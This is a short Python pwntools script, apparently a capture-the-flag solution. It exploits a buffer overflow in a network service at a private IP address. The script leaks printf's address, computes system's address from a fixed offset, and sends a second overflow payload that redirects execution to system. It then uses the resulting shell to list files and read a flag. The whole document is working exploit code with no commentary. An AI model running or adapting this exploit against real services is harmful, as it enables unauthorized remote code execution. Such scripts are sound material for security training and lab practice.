from pwn import *
p = remote("10.21.235.155",9999)
p.sendline(b"A"*44 + b"\xd3\x00\x41\x00")

print(p.recvuntil(b"Printf address: ").decode(errors="ignore"))

printf_addr = int(p.recvline().strip(), 16)
system_addr = printf_addr - 0xE6E0

p.sendline(b"A"*52 + p32(system_addr) + 
b"A"*4 + b"\x21\x02\x41\x00")
p.sendline("ls -al")
p.sendline("cat flag")
p.sendline("exit")
print(p.recvall().decode(errors="ignore"))